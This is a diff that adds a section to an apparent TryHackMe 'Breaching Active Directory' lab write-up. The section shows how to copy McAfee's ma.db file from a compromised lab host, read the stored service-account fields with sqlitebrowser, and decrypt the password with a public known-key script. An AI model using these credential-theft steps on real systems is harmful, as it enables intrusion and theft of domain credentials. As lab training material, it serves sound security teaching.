@@ -416,3 +416,57 @@ What is the username associated with the account that was stored in the PXE Boot
 What is the password associated with the account that was stored in the PXE Boot image?  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Breaching%20Active%20Directory_30.png" width="50%" height="50%">  
 このタスクの説明通りに実施すると、BootImageのユーザ・パスワードが確認できた。
+
+
+## Configuration Files
+The last enumeration avenue we will explore in this network is configuration files. Suppose you were lucky enough to cause a breach that gave you access to a host on the organisation's network. In that case, configuration files are an excellent avenue to explore in an attempt to recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration: 
+- Web application config files
+- Service configuration files
+- Registry keys
+- Centrally deployed applications
+
+Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.
+
+### Configuration File Credentials
+However, we will focus on recovering credentials from a centrally deployed application in this task. Usually, these applications need a method to authenticate to the domain during both the installation and execution phases. An example of such as application is McAfee Enterprise Endpoint Security, which organisations can use as the endpoint detection and response tool for security.  
+McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db. This database file can be retrieved and read with local access to the host to recover the associated AD service account. We will be using the SSH access on THMJMP1 again for this exercise.  
+The ma.db file is stored in a fixed location:
+```
+thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
+thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
+ Volume in drive C is Windows 10
+ Volume Serial Number is 6A0F-AA0F
+
+ Directory of C:\ProgramData\McAfee\Agent\DB      
+
+03/05/2022  10:03 AM    <DIR>          .
+03/05/2022  10:03 AM    <DIR>          ..
+03/05/2022  10:03 AM           120,832 ma.db      
+               1 File(s)        120,832 bytes     
+               2 Dir(s)  39,426,285,568 bytes free
+```
+We can use SCP to copy the ma.db to our AttackBox:
+```
+thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+thm@10.200.4.249's password:
+ma.db 100%  118KB 144.1KB/s   00:00
+```
+To read the database file, we will use a tool called sqlitebrowser. We can open the database using the following command:
+```
+thm@thm:# sqlitebrowser ma.db
+```
+Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT_REPOSITORIES table:  
+<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Breaching%20Active%20Directory_31.png" width="50%" height="50%">  
+We are particularly interested in the second entry focusing on the DOMAIN, AUTH_USER, and AUTH_PASSWD field entries. Make a note of the values stored in these entries. However, the AUTH_PASSWD field is encrypted. Luckily, McAfee encrypts this field with a known key. Therefore, we will use the following old python2 script to decrypt the password. The script has been provided as a downloadable task file or on the AttackBox, it can be found in the /root/Rooms/BreachingAD/task7/ directory.  
+Note: The tool we will use here is quite old. It uses Python v2 and relies on an old crypto library. If you cannot get the script to work on your own VM, please make use of the AttackBox. However, there has been a recent update to the application to ensure that it works on Python3 as well, you can download the latest version here: https://github.com/funoverip/mcafee-sitelist-pwd-decryption  
+You will have to unzip the mcafee-sitelist-pwd-decryption.zip file:
+```
+thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
+```
+By providing the script with our base64 encoded and encrypted password, the script will provide the decrypted password:
+```
+thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
+Crypted password   : <AUTH PASSWD VALUE>
+Decrypted password : <Decrypted Pasword>
+```
+We now once again have a set of AD credentials that we can use for further enumeration! This is just one example of recovering credentials from configuration files. If you are ever able to gain a foothold on a host, make sure to follow a detailed and refined methodology to ensure that you recover all loot from the host, including credentials and other sensitive information that can be stored in configuration files.
